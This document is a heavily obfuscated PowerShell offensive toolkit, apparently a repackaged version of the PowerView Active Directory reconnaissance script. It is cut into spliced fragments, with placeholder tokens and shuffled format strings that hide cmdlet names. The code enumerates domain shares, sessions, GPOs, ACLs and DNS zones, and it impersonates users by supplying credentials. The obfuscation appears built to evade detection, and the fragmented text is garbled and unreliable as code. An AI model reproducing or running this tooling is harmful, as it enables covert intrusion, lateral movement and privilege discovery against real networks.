        [ValidateSet(S5zDNS5z, {Z3b{2}{0}{1}Z3b -fS5zcaS5z,S5zlS5z,S5zCanoniS5z}, S5zNT4S5z, {Z3b{0}{1}Z3b-fS5zDS5z,S5zisplayS5z}, {Z3b{0}{2}{1}Z3b-fS5zDS5z,S5zleS5z,S5zomainSimpS5z}, {Z3b{2}{4}{1}{0}{3}Z3b -f S5zimS5z,S5ziseSS5z,S5zES5z,S5zpleS5z,S5znterprS5z}, {Z3b{0}{1}Z3b-fS5zGUS5z,S5zIDS5z}, {Z3b{1}{0}Z3b -f S5zknownS5z,S5zUnS5z}, S5zUPNS5z, {Z3b{1}{2}{0}Z3b-fS5zxS5z,S5zCanonicS5z,S5zalES5z}, S5zSPNS5z)]
        YoV{outputtIJKYIJKPe},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{doIJKmIJKAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{3}{4}{0}Z3b-f S5zrollerS5z,S5znS5z,S5zDomaiS5z,S5zCoS5z,S5zntS5z})]
        [String]','JKouIJKNdpIJKARameters}[(Z3b{2}{1}{0}Z3b-fS5zpeS5z,S5zScoS5z,S5zSearchS5z)]) { YoV{SeIJKARChIJKeRIJKAIJKRIJKGuMents}[(Z3b{0}{1}{2}Z3b -f S5zSearS5z,S5zchScoS5z,S5zpeS5z)] = YoV{SIJKEIJKARCHScIJKOpe} }
        if (YoV{PsbOuNIJKDpAIJKRIJKAmeIJKTIJKERs}[(Z3b{0}{3}{2}{1}Z3b -fS5zResultPagS5z,S5zeS5z,S5zSizS5z,S5zeS5z)]) { YoV{SIJKEIJKARCHIJKerIJKArgUMentS}[(Z3b{1}{0}{2}{4}{3}Z3b-f S5ztS5z,S5zResulS5z,S5zPagS5z,S5zSizeS5z,S5zeS5z)] = YoV{ResuLTpIJKAgESIIJKze}','Z3b -fS','LAce  ([ChaR]82+[ChaR]89+[ChaR]116),[ChaR]92))).Z3bsNIJKAMESZ3b

                        ForEach (YoV{sIJKeRvIJKer} in YoV{SEIJKRvIJKEIJKRKeys}) {

                            YoV{uSernaIJKMIJKeHINt} = YoV{rIJKEg}.(Z3b{1}{2}{3}{0}Z3b -f S5zValueS5z,S5zGetS5z,S5zStrS5z,S5zingS5z).Invoke(YoV{HIJKKU}, (Z3bYoVUserSID5rjSoftware5rjMicrosoft5rjTerminal Z3b+S5zSS5z+S5zerver S5z+Z3bClient5rjServers5rjYoVServerZ3b), (Z3b{2}{3}{0}{1}Z3b -f S5zameHinS5z,S5ztS5z,S5zUS5z,S5zsernS5z)).Z3bSIJKVaIJKlUeZ3b

                            YoV{FOIJKUNDIJKcOnIJKNectioN} = &(Z3b{1}{2}{0}Z3b -fS5ztS5z,S5zNew-ObjS5z,S5zecS5z) (Z3b{1}{2}{0}Z3b-f S5ztS5z,S5zPSS5z,S5zObjecS5z)
                            YoV{FIJKOIJKUNDcIJKOIJKNnECTiOn} JGO &(Z3b{0}{1}{2}Z3b -f S5zAdS5z,S5zd-MeS5z,S5zmberS5z) (Z3b{1}{3}{2}{0}Z3b-fS5ztyS5z,S5zNS5z,S5zrS5z,S5zotepropeS5z) (Z3b{0}{1}{2}{3}Z3b -f S5zCS5z,S5zomS5z,S5zputeS5z,S5zrNameS5z) YoV{coIJKmIJKpuTeR}
                            YoV{FOuIJKNDcoIJKNIJKNECtIon} JGO &(Z3b{2}{1}{0}Z3b -fS5zMemberS5z,S5zdd-S5z,S5zAS5z) (Z3b{2}{1}{0}Z3b -f S5ztyS5z,S5zteproperS5z,S5zNoS5z) (Z3b{0}{2}{1}Z3b -fS5zUsS5z,S5zameS5z,S5zerNS5z) YoV{USEIJKRnIJKAME}
                            YoV{FOUIJKNDIJKCoIJKNNeIJKCTION} JGO &(Z3b{3','5z,S5zvicS5z).Invoke(YoV{HIJKAndlE})
                YoV{IIJKsaIJKdMiN} JGO &(Z3b{0}{2}{1}Z3b-fS5zAdd-MeS5z,S5zrS5z,S5zmbeS5z) (Z3b{0}{2}{1}{3}Z3b -f S5zNoteS5z,S5zropertS5z,S5zpS5z,S5zyS5z) (Z3b{1}{0}{2}Z3b-fS5ziS5z,S5zIsAdmS5z,S5znS5z) YoV{TrIJKUe}
            }
            else {
                &(Z3b{3}{4}{1}{2}{0}Z3b -fS5zseS5z,S5ze-VerS5z,S5zboS5z,S5zWrS5z,S5zitS5z) Z3b[Test-AdminAccess] Error: YoV(([ComponentModel.Win32Exception] YoVLastError).Message) Z3b
                YoV{isAIJKdmiN} JGO &(Z3b{1}{2}{0}Z3b -f S5zberS5z,S5zAdd-MeS5z,S5zmS5z) (Z3b{0}{2}{1}Z3b -fS5zNotepS5z,S5zopertyS5z,S5zrS5z) (Z3b{1}{0}Z3b -fS5zAdminS5z,S5zIsS5z) YoV{faIJKLSE}
            }
            YoV{iIJKsIJKADMin}.Z3bPSoIJKBJEIJKctZ3b.Z3btIJKyIJKpENIJKAmESZ3b.(Z3b{2}{1}{0}Z3b -fS5ztS5z,S5zrS5z,S5zInseS5z).Invoke(0, (Z3b{4}{0}{5}{1}{2}{','dd-S5z,S5zerS5z,S5zMembS5z) (Z3b{0}{1}{2}Z3b -f S5zNotepS5z,S5zroperS5z,S5ztyS5z) S5zTTLS5z YoV{TIJKTL}
        YoV{DIJKNSrECOIJKRIJKDIJKoBjeCT} JGO &(Z3b{0}{1}{2}Z3b-f S5zAdd-MS5z,S5zemS5z,S5zberS5z) (Z3b{3}{0}{1}{2}Z3b -fS5zotepropeS5z,S5zrS5z,S5ztyS5z,S5zNS5z) S5zAgeS5z YoV{AIJKGE}
        YoV{dnIJKSRECoRIJKDObJeIJKct} JGO &(Z3b{1}{2}{0}Z3b -fS5z-MemberS5z,S5zAdS5z,S5zdS5z) (Z3b{0}{3}{1}{2}Z3b -f S5zNoteS5z,S5zrS5z,S5zopertyS5z,S5zpS5z) (Z3b{2}{0}{1}Z3b -fS5zmeStaS5z,S5zmpS5z,S5zTiS5z) YoV{tImIJKeIJKStamp}
        YoV{dIJKNSIJKRecoRDObIJKjIJKECT} JGO &(Z3b{1}{2}{0}Z3b-fS5zmberS5z,S5zAS5z,S5zdd-MeS5z) (Z3b{1}{2}{0}{3}Z3b -f S5zropS5z,S5zNotS5z,S5zepS5z,S5zertyS5z) (Z3b{0}{1}Z3b -fS5zDaS5z,S5ztaS5z) YoV{DAIJKTa}
        YoV{DnIJKSIJKRECIJKOrIJKDObJIJKect}
    }
}


function GeIJKTIJK-DOIJKmAinIJKDNszoNE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{2}{3}{0}Z3b-fS5zssS5z,S5zPSShouldPS5z,S5zroS5z,S5zceS5z}, S5zS5z)]
    [OutputType({Z3b{1}{0}{4}{2}{3}Z3b-f S5zwS5z,S5zPoS5z,S5zSZoS5z,S5zneS5z,S5zerView.DNS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(poSITiON = 0, vALUeFROmPIPELine = YoV{TIJKRue})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DomIJKAIJKiN},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{0}Z3b-fS5zollerS5z,S5zDomainCoS5z,S5zntrS5z})]
        [String]
        YoV{sIJKEIJKRVEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        Yo','roS5z,S5zpertyS5z) (Z3b{1}{3}{2}{0}{4}Z3b -fS5zrS5z,S5zTrusS5z,S5zttS5z,S5ztAS5z,S5zibutesS5z) YoV{InIJKFo}.Z3bTrUSTAtIJKTRIJKibuTesZ3b
                        YoV{dIJKoMIJKAINTRUIJKST} JGO &(Z3b{3}{0}{2}{1}Z3b -fS5zd-MeS5z,S5zrS5z,S5zmbeS5z,S5zAdS5z) (Z3b{2}{1}{3}{0}Z3b -f S5zertyS5z,S5zroS5z,S5zNotepS5z,S5zpS5z) (Z3b{0}{2}{1}Z3b -fS5zTaS5z,S5zdS5z,S5zrgetSiS5z) YoV{SIJKIdsIJKTriNG}
                        YoV{DIJKOIJKmaintRUsT} JGO &(Z3b{2}','
        YoV{cRedIJKEIJKNtIAL} =   YoV{jIJKFi}::Z3beMPIJKTyZ3b
    )

    PROCESS {
        YoV{nEIJKTFORIJKESTArg','IJKgeTPAIJKTh})).Z3bhoIJKSTZ3b
                if (-not YoV{mAppEIJKDcIJKOmputIJKeIJKRS}[YoV{HostIJKCoIJKmIJKPUIJKTer}]) {
                    
                    &(Z3b{4}{2}{3}{0}{1}{5}Z3b-f S5zeS5z,S5zmoteConS5z,S5z-S5z,S5zRS5z,S5zAddS5z,S5znectionS5z) -ComputerName YoV{hOIJKSIJKTCOMpUIJKTER} -Credential YoV{CIJKREDenIJKTIJKIAl}
                    Y','5z -replace S5z,S5z,S5z.S5z
                        &(Z3b{0}{1}{2}Z3b-fS5zWrite-VeS5z,S5zrbS5z,S5zoseS5z) (S5z[S5z+S5zGet-DomaS5z+S5z','5z) (Z3b{1}{3}{2}{0}Z3b-fS5zrS5z,S5zGet-DomS5z,S5znUseS5z,S5zaiS5z)
&(Z3b{0}{1}Z3b -fS5zSet-AlS5z,S5ziasS5z) (Z3b{0}{4}{3}{1}{2}Z3b -f S5zGet-US5z,S5zeS5z,S5zntS5z,S5zEvS5z,S5zserS5z) (Z3b{2}{3}{1}{0}Z3b -f S5ztS5z,S5zvenS5z,S5zGet-S5z,S5zDomainUserES5z)
&(Z3b{2}{1}{0}Z3b -f S5zliasS5z,S5zAS5z,S5zSet-S5z) (Z3b{0}{3}{2}{1}Z3b -f S5zGeS5z,S5zrS5z,S5zComputeS5z,S5zt-NetS5z) (Z3b{1}{0}{2}{5}{3}{4}Z3b-f S5zetS5z,S5zGS5z,S5z-DoS5z,S5zinS5z,S5zComputerS5z,S5zmaS5z)
&(Z3b{2}{1}{0}Z3b -fS5zliasS5z,S5zet-AS5z,S5zSS5z) (Z3b{0}{2}{1}Z3b -f S5zGet-S5z,S5ztS5z,S5zADObjecS5z) (Z3b{1}{2}{3}{0}Z3b -f S5zctS5z,S5zGetS5z,S5z-DomaS5z,S5zinObjeS5z)
&(Z3b{0}{1}Z3b -f S5zSet-S5z,S5zAliasS5z) (Z3b{0}{3}{1}{2}Z3b-fS5zSeS5z,S5zADOS5z,S5zbjectS5z,S5zt-S5z) (Z3b{0}{1}{2}{3}Z3b-f S5zSet-DoS5z,S5zmainObjeS5z,S5zcS5z,S5ztS5z)
&(Z3b{2}{0}{1}Z3b -f S5zAliS5z,S5zasS5z,S5zSet-S5z) (Z3b{1}{2}{0}Z3b-f S5zctAclS5z,S5zGet-S5z,S5zObjeS5z) (Z3b{0}{4}{5}{1}{2}{3}Z3b-f S5zGS5z,S5z-DomainObjeS5z,S5zctAS5z,S5zclS5z,S5zeS5z,S5ztS5z)
&(Z3b{2}{3}{1}{0}Z3b -fS5zasS5z,S5ziS5z,S5zSS5z,S5zet-AlS5z) (Z3b{1}{3}{2}{0}Z3b -fS5zlS5z,S5zAdd-ObS5z,S5zectAcS5z,S5zjS5z) (Z3b{2}{0}{1}{3}Z3b-f S5z-DS5z,S5zomaS5z,S5zAddS5z,S5zinObjectAclS5z)
&(Z3b{1}{0}{2}Z3b -fS5zAliS5z,S5zSet-S5z,S5zasS5z) (Z3b{0}{2}{1}{3}{4}Z3b-f S5zInvoS5z,S5zACS5z,S5zke-S5z,S5zLS5z,S5zScannerS5z) (Z3b{4}{6}{2}{3}{1}{5}{0}Z3b -fS5znAclS5z,S5zgDS5z,S5zerestiS5z,S5znS5z,S5zFinS5z,S5zomaiS5z,S5zd-IntS5z)
&(Z3b{1}{0}Z3b-fS5z-AliasS5z,S5zSetS5z) (Z3b{1}{2}{0}Z3b-fS5zpS5z,S5zGet-GUIS5z,S5zDMaS5z) (Z3b{0}{1}{2}{3}Z3b-f S5zGet-DS5z,S5zomaS5z,S5zinGUIDS5z,S5zMapS5z)
&(Z3b{0}{1}{2}Z3b -fS5zSeS5z,S5ztS5z,S5z-AliasS5z) (Z3b{2}{0}{1}Z3b-f S5ze','5z,S5zStopOnS5z)]) {

            &(Z3b{3}{0}{1}{2}Z3b-fS5z-VS5z,S5zerbosS5z,S5zeS5z,S5zWriteS5z) Z3b[Find-DomainShare] Total number of hosts: YoV(YoVTargetComputers.count) Z3b
            &(Z3b{2}{0}{1}{3}Z3b-fS5z-S5z,S5zVerS5z,S5zWriteS5z,S5zboseS5z) (S5z[S5z+S5zFS5z+S5zind-S5z+S5zDoS5z+S5zmainSharS5z+S5ze] S5z+S5zDelay:S5z+S5z S5z+Z3bYoVDelay, Z3b+S5zJS5z+S5zitterS5z+S5z: S5z+Z3bYoVJitterZ3b)
            YoV{CouIJKNtIJKER} = 0
            YoV{rIJKANIJKDnO} = &(Z3b{2}{1}{0}Z3b -fS5z-ObjectS5z,S5zewS5z,S5zNS5z) (Z3b{0}{2}{1}{3}{4}Z3b-fS5zSS5z,S5zsS5z,S5zyS5z,S5ztem.RanS5z,S5zdomS5z)

            ForEach (YoV{TIJKARgEtCIJKoMpUIJKTIJKer} in YoV{TIJKAIJKRgEIJKTCIJKOmPUtErs}) {
                YoV{coIJKUntIJKEr} = YoV{CIJKouIJKNtER} + 1

                
                &(Z3b{1}{2}{0}Z3b -fS5zepS5z,S5zStart-SS5z,S5zleS5z) -Seconds YoV{RANIJKdNo}.(Z3b{0}{1}Z3b-f S5zNeS5z,S5zxtS5z).Invoke((1-YoV{JIIJKTTER})*YoV{dIJKeLIJKAY}, (1+YoV{jIJKiTIJKTER})*YoV{deIJKlIJKAY})

                &(Z3b{2}{3}{1}{0}Z3b-fS5zseS5z,S5zerboS5z,S5zWriteS5z,S5z-VS5z) Z3b[Find-DomainShare] Enumerating server YoVTargetComputer (YoVCounter of YoV(YoVTargetComputers.count)) Z3b
                &(Z3b{3}{1}{4}{0}{2}Z3b-f S5zaS5z,S5zokeS5z,S5zndS5z,S5zInvS5z,S5z-CommS5z) -ScriptBlock YoV{HoSIJKTENUIJKMBLIJKock} -ArgumentList YoV{taRIJKgETcoIJKmPUtER}, YoV{CHIJKeCKsIJKhaIJKREIJKACcesS}, YoV{LOgonIJKToKIJKEn}
            }
        }
        else {
            &(Z3b{1}{0}{4}{2}{3}Z3b -fS5zeS5z,S5zWritS5z,S5zboS5z,S5zseS5z,S5z-VerS5z) (S5z[S5z+S5zFindS5z+S5z-DomS5z+S5zainShare]S5z+S5z S5z+S5zUsS5z+S5zing S5z+S5zthreaS5z+S5zdinS5z+S5zg S5z+S5zwitS5z+S5zh S5z+S5zthreadS5z+S5zsS5z+S5z: S5z+Z3bYoVThreadsZ3b)

            
            YoV{SIJKc','mAppIJKEIJKDPathS}.Z3bkIJKeysZ3b JGO &(Z3b{3}{1}{2}{0}Z3b -fS5zectS5z,S5zh-OS5z,S5zbjS5z,S5zForEacS5z) { &(Z3b{2}{1}{4}{0}{3}Z3b-fS5zConneS5z,S5z-RemotS5z,S5zRemoveS5z,S5zctionS5z,S5zeS5z) -Path YoV{_} }
    }
}


function GeIJKTIJK-DoMAIJKIngpO {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{3}{2}{1}Z3b-f S5zPSShouldPS5z,S5zsS5z,S5zesS5z,S5zrocS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{4}{3}{1}{7}{2}{9}{10}{5}{6}{0}{8}Z3b -f S5zgnS5z,S5zedVS5z,S5zrsS5z,S5zSUseDeclarS5z,S5zPS5z,S5zsS5z,S5zsiS5z,S5zaS5z,S5zmentsS5z,S5zMorS5z,S5zeThanAS5z}, S5zS5z)]
    [OutputType({Z3b{2}{0}{1}{3}Z3b-f S5zoweS5z,S5zrView.GPS5z,S5zPS5z,S5zOS5z})]
    [OutputType({Z3b{1}{3}{0}{2}','YoV{psBIJKOIJKUnDIJKparIJKAmeTERs}[(Z3b{2}{0}{1}Z3b-fS5zentS5z,S5zialS5z,S5zCredS5z)]) {
            YoV{LOGoIJKNIJKToIJKKEN} = &(Z3b{1}{3}{4}{0}{2}Z3b-f S5zrsonaS5z,S5zInvokeS5z,S5ztionS5z,S5z-S5z,S5zUserImpeS5z) -Credential YoV{CRIJKEDentIJKiaL}
        }
    }

    PROCESS {
        ForEach (YoV{CIJKomPuIJKTer} in YoV{CIJKOMPuTErnIJKAME}) {
            
            YoV{queryIJKleIJKVEl} = 10
            YoV{PtRiIJKNIJKFo} =   (  &(Z3b{1}{0}Z3b -f S5zIS5z,S5zgCS5z)  (S5zvARiaBle:6S5z+S5zRS5z+S5zKS5z+S5z25PS5z) ).Z3bVALIJKUeZ3b::Z3bZIJKeRoZ3b
            YoV{EnIJKTrIJKIESREAd} = 0
            YoV{tOTaLIJKRIJKEAd} = 0
            YoV{RIJKeIJKSUmEHAnDIJKlE} = 0

            
            YoV{reIJKsUIJKlt} = YoV{NetIJKAIJKpI32}::(Z3b{2}{4}{1}{0}{3}Z3b -fS5zEnuS5z,S5zonS5z,S5zNetSessS5z,S5zmS5z,S5ziS5z).Invoke(YoV{compuIJKTIJKer}, S5zS5z, YoV{uIJKSerNAIJKME}, YoV{QIJKUERyIJKleVIJKEl}, [ref]YoV{ptrInIJKFO}, -1, [ref]YoV{EIJKNTRIJKIeSReIJKAd}, [ref]YoV{ToTALRIJKeIJKAD}, [ref]YoV{rESUMEIJKhaIJKNIJKdlE})

            
            YoV{oIJKFIJKFSeT} = YoV{ptIJKRIJKInFo}.(Z3b{1}{0}Z3b-fS5znt64S5z,S5zToIS5z).Invoke()

            
            if ((YoV{resuIJKLt} -eq 0) -and (YoV{OffIJKset} -gt 0)) {

                
                YoV{IIJKNcRemIJKenT} = YoV{sessIJKIIJKoN_InfIJKO_10}::(Z3b{0}{1}{2}Z3b-f S5zGeS5z,S5ztS5z,S5zSizeS5z).Invoke()

                
                for (YoV{I} = 0; (YoV{i} -lt YoV{EIJKNtRIeSIJKRIJKEAd}); YoV{I}++) {
                    
                    YoV{nIJKewIntIJKptR} = &(Z3b{2}{1}{0}Z3b -fS5zectS5z,S5zjS5z,S5zNew-ObS5z) (Z3b{2}{0}{1}Z3b -f S5ztemS5z,S5z.IntptrS5z,S5zSysS5z) -ArgumentList YoV{OFIJKFIJKSet}
                    YoV{IIJKNFO} = YoV{NIJKEwiNtIJKPtR} -as YoV{seIJKSSioN_IJKINIJKFo_10}

                    
                    YoV{sIJKesSiIJKoN} = YoV{inIJKFO} JGO &(Z3b{3}{0}{2}{1}Z3b -fS5z-ObjS5z,S5zctS5z,S5zeS5z,S5zSelectS5z) (S5z*S5z)
                    YoV{SeIJKSsiIJKon} JGO &(Z3b{2}{3}{0}{1}Z3b-f S5zmS5z,S5zberS5z,S5zAdd-S5z,S5zMeS5z) (Z3b{0}{2}{1}{3}Z3b -fS5zNoteprS5z,S5zerS5z,S5zopS5z,S5ztyS5z) (Z3b{2}{1}{0}Z3b-fS5zmeS5z,S5zuterNaS5z,S5zCompS5z) YoV{coMIJKPIJKUTIJKeR}
                    YoV{seIJKsSion}.Z3bPsIJKOBJEctZ3b.Z3btyPIJKenAMIJKesZ3b.(Z3b{2}{0}{1}Z3b-f S5znsS5z,S5zertS5z,S5zIS5z).Invoke(0, (Z3b{4}{3}{1}{6}{0}{5}{2}Z3b -fS5ziew.S5z,S5zwerS5z,S5zInfoS5z,S5zoS5z,S5zPS5z,S5zSessionS5z,S5zVS5z))
                    YoV{oFIJKFsET} = YoV{NEWIJKiNTPIJKTr}.(Z3b{1}{0}Z3b -f S5zt64S5z,S5zToInS5z).Invoke()
                    YoV{oIJKFFSEt} += Y','  &(Z3b{2}{0}{1}Z3b-f S5ziS5z,S5zte-VerboseS5z,S5zWrS5z) (S5z[Get-S5z+S5zDomaiS5z+S5znS5z+S5zGPOS5z+S5z] S5z+S5zGPS5z+S5zOAdS5z+S5zsPS5z+S5zaS5z+S5zths: S5z+Z3bYoVGPOAdsPathsZ3b)

                
                if (YoV{OLdPrIJKopEIJKRTIIJKEs}) { YoV{seaRChEIJKRIJKArIJKgIJKUMIJKeNts}[(Z3b{0}{2}{1}Z3b-fS5zPrS5z,S5zertiesS5z,S5zopS5z)] = YoV{oIJKLDIJKprOPERIJKTIIJKeS} }
                else { YoV{SEIJKARIJKchERAIJKRguMenTs}.(Z3b{2}{1}{0}Z3b-f S5zeS5z,S5zvS5z,S5zRemoS5z).Invoke((Z3b{1}{2}{0}Z3b -f S5zesS5z,S5zPropS5z,S5zertiS5z)) }
                YoV{sIJKeAIJKRcIJKhERaRIJKGUMents}.(Z3b{2}{0}{1}Z3b-fS5zvS5z,S5zeS5z,S5zRemoS5z).Invoke((Z3b{1}{0}{2}Z3b -fS5ztS5z,S5zIdentiS5z,S5zyS5z))

                YoV{gPoIJKAdIJKSPaIJKTHS} JGO &(Z3b{3}{0}{1}{2}Z3b-fS5zrS5z,S5ze-ObjS5z,S5zectS5z,S5zWheS5z) {YoV{_} -and (YoV{_} -ne S5zS5z)} JGO &(Z3b{1}{3}{0}{2}Z3b-f S5zbjecS5z,S5zFS5z,S5ztS5z,S5zorEach-OS5z) {
                    
                    YoV{sIJKEaIJKRcHeraRGUMEIJKNTS}[(Z3b{1}{3}{2}{0}Z3b -f S5zeS5z,S5zSeaS5z,S5zBasS5z,S5zrchS5z)] = YoV{_}
                    YoV{sIJKEARcIJKhErArGumIJKeNTs}[(Z3b{3}{2}{1}{0}Z3b -f S5zrS5z,S5zteS5z,S5zFilS5z,S5zLDAPS5z)] = (Z3b{6}{1}{3}{5}{0}{7}{4}{2}{8}{9}Z3b -fS5zegory=groupPoliS5z,S5zoS5z,S5zinS5z,S5zbjecS5z,S5zntaS5z,S5ztCatS5z,S5z(S5z,S5zcyCoS5z,S5zerS5z,S5z)S5z)
                    &(Z3b{3}{4}{1}{0}{2}Z3b -fS5zObjS5z,S5zomainS5z,S5zectS5z,','BounDpAIJKRaMETIJKeRS}[(Z3b{0}{2}{1}{3}Z3b -f S5zCS5z,S5zntiaS5z,S5zredeS5z,S5zlS5z)]) {
            YoV{LOIJKgoNIJKTOkeN} = &(Z3b{4}{6}{5}{3}{1}{0}{2}Z3b -fS5zsS5z,S5zrS5z,S5zonationS5z,S5zpeS5z,S5zInS5z,S5zerImS5z,S5zvoke-UsS5z) -Credential YoV{cIJKREDeIJKNtIIJKAl}
        }
    }

    PROCESS {
        ForEach (YoV{cOmIJKputIJKer} in YoV{cIJKOIJKMPuTErnAIJKME}) {
            
            YoV{qUErIJKyLIJKEvel} = 1
            YoV{pTrIIJKNfO} =   YoV{6IJKRK2IJK5P}::Z3bZIJKERoZ3b
            YoV{ENIJKTIJKRIeSRIJKeAd} = 0
            YoV{ToTIJKALreIJKAD} = 0
            YoV{REsUIJKMehaNDIJKlE} = 0

            
            YoV{RIJKEsUIJKlt} = YoV{NeTIJKAPIJKI32}::Z3bNIJKEtshArEeIJKNIJKUMZ3b(YoV{coIJKMPuTER}, YoV{QIJKUeIJKRYIJKlEveL}, [ref]YoV{pIJKTrIJKiNFO}, -1, [ref]YoV{ENIJKTRIIJKeSrIJKeaD}, [ref]YoV{tIJKotALIJKREad}, [ref]YoV{ResumIJKEIJKHIJKAnDlE})

            
            YoV{OFfIJKseT} = YoV{PTIJKRIJKINFo}.(Z3b{1}{0}Z3b -f S5z4S5z,S5zToInt6S5z).Invoke()

            
            if ((YoV{REIJKsULt} -eq 0) -and (YoV{OfFSIJKET} -gt 0)) {

                
                YoV{iNCIJKREMIJKEnt} = YoV{sharIJKe_INfIJKo_1}::(Z3b{0}{1}{2}Z3b -fS5zGeS5z,S5ztSS5z,S5zizeS5z).Invoke()

                
                for (YoV{i} = 0; (YoV{i} -lt YoV{entRIJKiEIJKsREIJKAD}); YoV{i}++) {
                    
                    YoV{nEIJKWiIJKNtpTR} = &(Z3b{1}{2}{0}Z3b-f S5zctS5z,S5zNew-ObS5z,S5zjeS5z) (Z3b{1}{3}{2}{0}Z3b-f S5zptrS5z,S5zSysS5z,S5zntS5z,S5ztem.IS5z) -ArgumentList YoV{OIJKFFSIJKet}
                    YoV{IIJKNFo} = YoV{NEIJKWIJKInTIJKPTr} -as YoV{sHAreIJK_IJKINfo_1}

                    
                    YoV{sIJKHARE} = YoV{IIJKNfo} JGO &(Z3b{2}{1}{3}{0}Z3b -f S5zectS5z,S5zt-S5z,S5zSelecS5z,S5zObjS5z) (S5z*S5z)
                    YoV{sHIJKArE} JGO &(Z3b{0}{1}{2}Z3b-fS5zAdd-MemS5z,S5zbeS5z,S5zrS5z) (Z3b{1}{0}{3}{2}Z3b-f S5zoS5z,S5zNS5z,S5zpropertyS5z,S5zteS5z) (Z3b{2}{1}{3}{0}Z3b-fS5zmeS5z,S5zerS5z,S5zComputS5z,S5zNaS5z) YoV{cOmIJKPIJKUter}
                    YoV{SIJKhare}.Z3bpIJKSOIJKBjEctZ3b.Z3bTYPIJKEIJKNAmesZ3b.(Z3b{1}{0}Z3b-f S5znsertS5z,S5zIS5z).Invoke(0, (Z3b{0}{4}{1}{2}{3}Z3b-fS5zPowS5z,S5znS5z,S5zfS5z,S5zoS5z,S5zerView.ShareIS5z))
                    YoV{ofIJKFSEt} = YoV{nEwIJKInIJKTptr}.(Z3b{0}{2}{1}Z3b -fS5zToIntS5z,S5z4S5z,S5z6S5z).Invoke()
                    YoV{oIJKFfIJKSeT} += YoV{iNIJKCrEIJKMeNT}
                    YoV{sIJKhArE}
                }

 ','am (
        [Parameter(POsitIOn = 0, valUEFRoMPipeLinE = YoV{tRIJKUe}, VALUeFROMPIPELINeByPrOPErTYNAMe = YoV{TIJKRUe})]
        [Alias({Z3b{0}{4}{1}{2}{3}Z3b -f S5zSamAS5z,S5zountNS5z,S5zamS5z,S5zeS5z,S5zccS5z}, {Z3b{1}{0}Z3b -fS5zameS5z,S5zNS5z}, {Z3b{0}{3}{1}{2}Z3b-fS5zDS5z,S5ztS5z,S5zNameS5z,S5zNSHosS5z})]
        [String[]]
        YoV{IIJKDIJKeNtIJKitY},

        [Switch]
        YoV{UNCoNIJKStIJKRaIneD},

        [Switch]
        YoV{TRuSIJKTedIJKToIJKAIJKUTh},

        [Switch]
        YoV{PIJKRiNteRS},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{0}{3}{1}Z3b-fS5zePS5z,S5zmeS5z,S5zServicS5z,S5zrincipalNaS5z})]
        [String]
        YoV{sIJKPN},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{opIJKErIJKAIJKTIngsysteM},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{sIJKERIJKViCePacK},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{siTIJKEIJKNAme},

        [Switch]
        YoV{PiIJKNG},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{doIJKMAIJKin},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{2}{1}Z3b-f S5zFiltS5z,S5zrS5z,S5zeS5z})]
        [String]
        YoV{LIJKDIJKAPfIlTER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{PRIJKOPERIJKTIJKiES},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{0}{1}Z3b-fS5zDSS5z,S5zPathS5z,S5zAS5z})]
        [String]
        YoV{SIJKeIJKARChBAIJKse},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{2}{1}Z3b -f S5zDomaS5z,S5zllerS5z,S5zinControS5z})]
        [String]
        YoV{SERIJKVIJKER},

        [ValidateSet({Z3b{1}{0}Z3b -f S5zeS5z,S5zBasS5z}, {Z3b{0}{2}{1}Z3b-fS5zOnS5z,S5zLevelS5z,S5zeS5z}, {Z3b{1}{2}{0}Z3b-f S5ztreeS5z,S5zSS5z,S5zubS5z})]
        [St','}{5}{3}{2}Z3b -f S5zSSWD_S5z,S5zPS5z,S5zNGES5z,S5zNT_CHAS5z,S5zAS5z,S5zCAS5z), 64)
        YoV{UacIJKVIJKAluES}.(Z3b{1}{0}Z3b-f S5zddS5z,S5zAS5z).Invoke((Z3b{1}{4}{0}{2}{3}Z3b -f S5zD_TS5z,S5zENCS5z,S5zES5z,S5zXT_PWD_ALLOWEDS5z,S5zRYPTES5z), 128)
        YoV{uACvaIJKlUIJKeS}.(Z3b{1}{0}Z3b -f S5zdS5z,S5zAdS5z).Invoke((Z3b{4}{3}{2}{1}{0}Z3b -f S5zCCOUNTS5z,S5z_AS5z,S5zTES5z,S5zICAS5z,S5zTEMP_DUPLS5z), 256)
        YoV{UaIJKcvALIJKUes}.(Z3b{0}{1}Z3b -fS5zAdS5z,S5zdS5z).Invoke((Z3b{3}{1}{2}{0}Z3b -f S5zUNTS5z,S5zRMS5z,S5zAL_ACCOS5z,S5zNOS5z), 512)
        YoV{uacIJKVAIJKLIJKUeS}.(Z3b{1}{0}Z3b-f S5zddS5z,S5zAS5z).Invoke((Z3b{3}{1}{2}{4}{0}Z3b -fS5zOUNTS5z,S5zRDS5z,S5zOS5z,S5zINTES5z,S5zMAIN_TRUST_ACCS5z), 2048)
        YoV{uAcIJKVaLIJKUeS}.(Z3b{0}{1}Z3b -f S5zAS5z,S5zddS5z).Invoke((Z3b{5}{1}{3}{0}{4}{2}Z3b -fS5z_AS5z,S5zATIOS5z,S5zOUNTS5z,S5zN_TRUSTS5z,S5zCCS5z,S5zWORKSTS5z), 4096)
        YoV{UaIJKCVaLIJKUES}.(Z3b{1}{0}Z3b -f S5zdS5z,S5zAdS5z).Invoke((Z3b{3}{2}{4}{1}{0}{5}Z3b-f S5zCOUS5z,S5zACS5z,S5zRS5z,S5zSERVER_TS5z,S5zUST_S5z,S5zNTS5z), 8192)
